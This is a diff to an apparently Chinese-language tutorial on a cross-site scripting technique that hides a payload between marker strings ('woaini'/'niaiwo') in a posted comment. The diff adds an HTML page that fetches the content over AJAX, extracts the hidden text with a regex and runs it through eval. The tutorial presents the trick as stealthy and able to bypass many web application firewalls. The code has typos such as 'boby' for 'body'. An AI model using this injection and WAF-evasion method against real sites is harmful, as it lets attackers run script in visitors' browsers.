@@ -127,9 +127,34 @@ eval(document.boby.innerHTML.substring(document.boby.innerHTML.indexOf('woaini')
 
 那我留言，内容为`woainialert(&#039;xss&#039;)niaiwo`，你就会发现弹出对话框了，这种方法隐蔽性强，利用方便，可以绕过很多的WAF。不一定非要用ajax来获取，也可以在本地使用`indexOf`和`substring`来完成。如果你想，你还可以使用javascript正则来获取指定内容，下面是代码：
 
-
+1.html
 ```
-
+<html>
+<head>
+<title>ajax+正则匹配</title>
+<meta http-equiv="content-type" content="text/html;chaset=utf-8" />
+</head>
+<boby>
+<script>
+var xmlhttp;
+var request_text;
+if(window.XMLHttpRequest){
+xmlhttp = new XMLHttpRequest();
+}else{
+xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+}
+xmlhttp.onreadystatechange=function(){
+if(xmlhttp.readyState==4 &&xmlhttp.status==200){
+request_text=xmlhttp.responseText;
+var text = request_text.match(/woaini(.*)niaiwo/i);
+eval(text[1]);
+}
+}
+xmlhttp.open("POST","ajax.php","true");
+xmlhttp.send();
+</script>
+</boby>
+</html>
 ```
 
 
